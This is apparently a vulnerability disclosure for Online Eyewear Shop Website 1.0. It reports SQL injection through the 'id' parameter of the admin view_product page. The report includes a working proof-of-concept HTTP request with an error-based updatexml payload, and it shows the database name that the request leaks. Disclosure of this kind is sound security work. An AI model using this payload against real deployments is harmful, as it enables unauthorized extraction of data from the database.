## Online Eyewear Shop Website has a front-end SQL injection vulnerability

## Affected version: 
Online Eyewear Shop Website - 1.0

## Software:
https://www.sourcecodester.com/php/16089/online-eyewear-shop-website-using-php-and-mysql-free-download.html

## Vulnerability File:
http://localhost/oews/admin/?page=products/view_product

## Description:
Online Eyewear Shop Website1.0 has a SQL injection attack in /oews/admin/?page=products/view_product, and the attack parameter is id. Attackers can exploit this vulnerability to directly obtain sensitive information from the server.

Status: CRITICAL

POC
```
GET /oews/admin/?page=products/view_product&id=2%27%20and%20updatexml(1,concat(0x7e,(database())),3)--%20q HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=af5dsp386jat1uspen8v4e8hhq
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
```

Get the database name directly through the error report: oews_db

![CleanShot 2024-10-09 at 11 34 39@2x](https://github.com/user-attachments/assets/b540107f-1137-454d-84eb-5099820dae61)


## Code Analysis

![CleanShot 2024-10-09 at 11 35 45@2x](https://github.com/user-attachments/assets/8c1db128-29b4-4b67-93c1-7edac544cfa4)


